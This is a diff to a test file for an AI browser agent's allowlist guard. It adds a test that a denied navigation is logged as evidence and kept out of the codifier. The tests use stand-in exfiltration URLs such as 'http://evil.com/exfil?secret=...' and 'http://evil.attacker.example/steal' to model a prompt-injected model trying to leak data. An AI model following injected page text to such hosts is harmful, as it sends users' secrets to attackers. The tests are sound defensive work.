@@ -9,6 +9,7 @@ import { test, expect } from '@playwright/test';
 import { makeAllowlist } from '../src/allowlist.mjs';
 import { makeBrowserTools } from '../src/browser-tools.mjs';
 import { makeCodifyTools } from '../src/codify-tools.mjs';
+import { newFlow, flowToSeed } from '../src/flow.mjs';
 
 test('layer 1: an exfiltration host injected via page text is rejected by the allowlist', () => {
   const allow = makeAllowlist(['localhost', 'staging.acme.com']);
@@ -28,6 +29,22 @@ test('layer 1: browser_goto DENIES an off-allowlist URL even if the model is tri
   const res = await goto({ url: 'http://evil.com/exfil?secret=...' });
   expect(res.resultType).toBe('denied');
   expect(res.textResultForLlm).toMatch(/not on the allowlist/);
+});
+
+test('layer 1: a denied off-allowlist goto is RECORDED as evidence (denied step) but never seeds the codifier', async () => {
+  // Makes a leash break observable — the live red-team (#0009) asserts the only off-allowlist nav in
+  // the flow is denied:true. A silently-dropped deny would make that test vacuous.
+  const flow = newFlow({ goal: 'x', startUrl: 'http://localhost:3000' });
+  const tools = makeBrowserTools({
+    getCtx: async () => ({ pwcli: { cmd: async () => ({ ok: true, out: '' }) } }),
+    allow: makeAllowlist(['localhost']), allowlist: ['localhost'], sink: { steps: [] }, flow,
+  });
+  const goto = tools.find((t) => t.name === 'browser_goto').def.handler;
+  await goto({ url: 'http://evil.attacker.example/steal' });
+  // the attempt is captured, marked denied…
+  expect(flow.steps).toContainEqual({ action: 'goto', url: 'http://evil.attacker.example/steal', denied: true });
+  // …and the codifier seed excludes it (we never harden a blocked exfil nav).
+  expect(flowToSeed(flow)).not.toContain('evil.attacker.example');
 });
 
 test('layer 2: the gated toolset exposes NO capability outside the known-safe browser/codify surface', () => {
